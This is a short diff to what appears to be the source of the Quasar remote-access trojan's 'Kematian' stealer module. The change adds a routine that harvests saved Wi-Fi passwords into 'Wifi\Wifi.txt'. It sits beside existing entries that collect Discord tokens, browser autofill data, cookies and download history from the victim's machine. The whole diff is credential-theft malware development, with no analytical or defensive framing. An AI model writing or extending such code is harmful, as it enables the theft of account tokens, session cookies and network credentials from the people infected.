@@ -1,5 +1,6 @@
-﻿using Quasar.Client.Kematian.Browsers;
+using Quasar.Client.Kematian.Browsers;
 using Quasar.Client.Kematian.Discord;
+using Quasar.Client.Kematian.Wifi;
 using System;
 using System.Diagnostics;
 using System.Collections.Generic;
@@ -26,7 +27,7 @@ namespace Quasar.Client.Kematian
                     var methods = new KeyValuePair<Func<string>, string>[]
                     {
                                 new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
-
+                                new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
                                 new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
                                 new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
                                 new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
